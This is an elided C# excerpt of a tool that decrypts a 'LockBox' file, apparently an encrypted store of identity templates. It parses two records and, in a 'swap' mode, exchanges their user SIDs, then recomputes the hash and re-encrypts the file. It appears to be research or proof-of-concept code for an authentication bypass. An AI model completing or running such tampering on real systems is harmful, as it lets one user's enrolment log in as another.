...
public struct LockBoxRecordHeader
{
    ...
    public ulong LastEntryOffset;
    public ulong TemplateBlobSize;
    public ulong EncryptedTemplateBlobSize;
    public ulong PayloadBlobSize;
    public ulong IndexElementCount;
...
class Program
{
    ...
    static void HexDump(byte[] bytes, int bytesPerLine = 16)
    {
    ...
    static void Main(string[] args)
    {
        ...
        LockBoxProtectedData DecryptedLockBox = LockBoxProtectedData.FromFile(args[0]);


        Console.WriteLine("Calculated Hash:");
        var CalculatedHash = LockBoxComputeFileHash(args[0]);
        ...
        var lockBoxFileHeader = LockBoxFileHeader.FromFile(args[0]);
        Console.WriteLine(lockBoxFileHeader);


        var recordHeader = LockBoxRecordHeader.FromFile(args[0], 0x400 + 0x78);
        ...
        var recordHeader2 = LockBoxRecordHeader.FromFile(args[0], (long)(0x400 + 0x78 + recordHeader.RecordSize));
        ...
        if (args.Length > 1)
        {
            if (args[1] == "swap")
            {
                ...
                UpdateSidAndWriteRecord(recordHeader, recordHeader2.Identity, args[0], 0x400 + 0x78);
                UpdateSidAndWriteRecord(recordHeader2, recordHeader.Identity, args[0], (long)(0x400 + 0x78 + recordHeader.RecordSize));

                var UpdatedHash = LockBoxComputeFileHash(args[0]);
                UpdateHashAndEncryptToFile(DecryptedLockBox, UpdatedHash, args[0]);
